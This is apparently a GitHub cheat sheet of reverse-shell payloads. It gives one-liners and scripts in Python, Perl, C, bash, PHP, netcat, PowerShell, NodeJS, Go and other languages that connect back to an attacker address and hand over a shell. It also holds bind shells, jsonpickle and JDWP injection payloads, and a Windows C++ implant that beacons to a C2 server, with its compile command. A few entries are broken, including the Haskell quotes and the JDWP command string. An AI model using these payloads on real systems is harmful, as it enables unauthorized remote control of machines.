# Reverse-Shell-Cheat-Sheet
Basic reverse shells for any scenario

# Reverse Shell Types

- Python
- Perl
- C
- C++
- Bash TCP
- Bash UDP
- PHP
- Netcat
- Java
- Pure Groovy (Jenkins)
- Gawk 
- Telnet
- awk
- Socat
- xterm
- Powershell
- NodeJS
- TCLsh
- Golang
- jsonpickle 
- JDWP 


# Python

One-Liner
```

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

// Replace the IP & Port
```

One-Liner For Privilege Escalation
```
import os

os.system('bash -c "bash -i >& /dev/tcp/10.10.10.10/9999 0>&1"')

OR

import os

os.system('chmod +s /bin/bash')

```

Script
```
import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.10.10",443)); 
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/bash","-i"]);

// Replace the IP & Port

```


# Perl

```
One-Liner 
-----------------------------------------------------------

perl -e 'use Socket;$i="10.10.10.10";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

// Replace IP & Port

```

# C

Reverse Shell
```
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
 
int main (int argc, char **argv)
{
  int scktd;
  struct sockaddr_in client;
 
  client.sin_family = AF_INET;
  client.sin_addr.s_addr = inet_addr("10.10.10.10");
  client.sin_port = htons(9999);

  scktd = socket(AF_INET,SOCK_STREAM,0);
  connect(scktd,(struct sockaddr *)&client,sizeof(client));

  dup2(scktd,0); // STDIN
  dup2(scktd,1); // STDOUT
  dup2(scktd,2); // STDERR

  execl("/bin/sh","sh","-i",NULL,NULL);

  return 0;
}

// Replace IP & Port
Compile: gcc rev.c -o rev

```

Bind Shell

```
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
 
int main (int argc, char **argv)
{
  int scktd = -1;
  int scktd_client = -1;
  int i = -1;
  struct sockaddr_in server;
  struct sockaddr_in client;

  scktd = socket(AF_INET,SOCK_STREAM,0);
  if (scktd == -1)
    return -1;

  server.sin_family = AF_INET;
  server.sin_addr.s_addr = INADDR_ANY;
  server.sin_port = htons(9999);

  if(bind(scktd,(struct sockaddr *)&server,sizeof(server)) < 0)
    return -2;

  listen(scktd,3);
  i = sizeof(struct sockaddr_in);
  scktd_client = accept(scktd,(struct sockaddr *)&client,(socklen_t*)&i);
  if (scktd_client < 0)
    return -3;

  dup2(scktd_client,0); // STDIN
  dup2(scktd_client,1); // STDOUT
  dup2(scktd_client,2); // STDERR

  execl("/bin/sh","sh","-i",NULL,NULL);

  return 0;
}

// Replace Port
Connect to Port: nc <ip> 9999

```

# C++

```
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024


void RunShell(char* C2Server, int C2Port) {
    while(true) {
        Sleep(5000);    

        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2,2), &version);
        mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;
   
        addr.sin_addr.s_addr = inet_addr(C2Server);  
        addr.sin_port = htons(C2Port);    

        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }
        else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0) {
                closesocket(mySocket);
                WSACleanup();
                continue;
            }
            else {
                char Process[] = "cmd.exe";
                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);

                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0) {
                    closesocket(mySocket);
                    WSACleanup();
                    continue;
                }
                if (strcmp(RecvData, "exit\n") == 0) {
                    exit(0);
                }
            }
        }
    }
}

int main(int argc, char **argv) {
    FreeConsole();
    if (argc == 3) {
        int port  = atoi(argv[2]); 
        RunShell(argv[1], port);
    }
    else {
        char host[] = "10.10.10.10";  
        int port = 9999;               
        RunShell(host, port);
    }
    return 0;
}

// Replace IP & Port
// Save file as <anything>.cpp
```
Compile

```
apt install mingw-w64
i686-w64-mingw32-g++ rev.cpp -o rev.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```


# Bash TCP

```
One-Liner 
-----------------------------------------------------------

bash -i >& /dev/tcp/10.10.10.10/443 0>&1

// Replace IP & Port

```

# Bash UDP

```
One-Liner 
-----------------------------------------------------------
Victim
sh -i >& /dev/udp/10.10.10.10/443 0>&1

Attacker
nc -u -lvp 443

// Replace IP & Port

```

# PHP

```
One-Liner 
-----------------------------------------------------------

php -r '$sock=fsockopen("10.10.10.10",443);exec("/bin/sh -i <&3 >&3 2>&3");'

// Replace IP & Port

```

# NetCat

```
One-Liner 
-----------------------------------------------------------

nc -e /bin/sh 10.10.10.10 443
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 443 >/tmp/f 
find /home -exec nc -lvp 4444 -e /bin/bash \;

// Replace IP & Port

```

# Java

```
One-Liner 
-----------------------------------------------------------

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.10/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

// Replace IP & Port

```

# Pure Groovy (Jenkins)

```
One-Liner 
-----------------------------------------------------------

String host="localhost";
int port=443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

// Replace Host & Port

```

# Haskell

```
One-Liner 
-----------------------------------------------------------

import System.Process
main = do
callCommand “bash -c ‘bash -i >& /dev/tcp/10.10.10.10/1234 0>&1’”

// Replace IP & Port
// Save script with .hs extension

```

# Gawk

```
One-Liner 
-----------------------------------------------------------

#!/usr/bin/gawk -f

BEGIN {
        Port    =       443
        Prompt  =       "bkd> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}

// Replace Port

```

# Telnet

```
One-Liner 
-----------------------------------------------------------

rm -f /tmp/p; mknod /tmp/p p && telnet 10.10.10.10 443 0/tmp/p 2>&1

// Replace IP & Port

```

# awk

```
One-Liner 
-----------------------------------------------------------

awk 'BEGIN {s = "/inet/tcp/0/10.10.10.10/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

// Replace IP & Port

```


# Socat

```
One-Liner 
-----------------------------------------------------------
Victim

socat tcp-connect:10.10.10.10:443 exec:/bin/sh,pty,stderr,setsid,sigint,sane

Attacker 

socat file:`tty`,raw,echo=0 tcp-listen:443

// Replace IP & Port

```

# xterm

```
One-Liner 
-----------------------------------------------------------

xterm -display 10.10.10.10:1
Xnest :1
xhost +targetip

// Replace IP & Port

```

# Powershell

```
One-Liner's 
-----------------------------------------------------------

powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

// Replace IP & Port

```

# NodeJS

```
One-Liner's 
-----------------------------------------------------------

(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(443, "10.10.10.10", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; 
})();

// Replace IP & Port

```

# TCLsh

```
One-Liner's 
-----------------------------------------------------------

echo 'set s [socket 10.10.10.10 443];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh

// Replace IP & Port

```

# Golang

```
One-Liner's 
-----------------------------------------------------------

echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.10.10.10:443");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go

// Replace IP & Port

```

# jsonpickle 
```
{"py/object":"__main__.Shell","py/reduce":[{"py/function":"os.system"},["/usr/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1'"], 0, 0, 0]}

If netcat is installed

{"py/object":"__main__.Shell","py/reduce":[{"py/function":"os.system"},["/usr/bin/nc -e /bin/bash 10.10.10.10 443"], 0, 0, 0]}

// Replace IP & Port
```
# JDWP 
```
print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec("/bin/bash-c 'bash -i >& /dev/tcp/10.10.10.10/9999 0>&1'").getInputStream())).readLine())
```



